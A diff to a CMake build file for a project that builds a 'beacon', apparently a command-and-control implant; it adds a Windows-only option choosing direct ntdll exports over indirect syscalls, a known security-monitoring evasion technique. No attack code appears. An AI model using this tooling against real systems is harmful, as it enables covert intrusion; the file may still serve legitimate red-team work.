@@ -21,6 +21,7 @@ set(BUILD_TYPE "release" CACHE STRING "Build type: debug, release")
 set(OPTIMIZATION_LEVEL "" CACHE STRING "Override optimization level (e.g., O2, Os)")
 option(BUILD_TESTS "Build tests instead of beacon" OFF)
 option(ENABLE_LOGGING "Enable logging macros" ON)
+option(NO_SYSCALL "Use direct ntdll exports instead of indirect syscalls (Windows only)" OFF)
 
 # Normalize inputs
 string(TOLOWER "${ARCHITECTURE}" PIR_ARCH)
@@ -81,6 +82,12 @@ if(PIR_BUILD_TYPE STREQUAL "debug")
 endif()
 if(ENABLE_LOGGING)
     list(APPEND PIR_DEFINES ENABLE_LOGGING)
+endif()
+if(NO_SYSCALL)
+    if(NOT PIR_PLATFORM STREQUAL "windows")
+        message(FATAL_ERROR "[pir] NO_SYSCALL is only meaningful on PLATFORM=windows (got '${PIR_PLATFORM}')")
+    endif()
+    list(APPEND PIR_DEFINES NO_SYSCALL)
 endif()
 
 # Log resolved options at verbose level
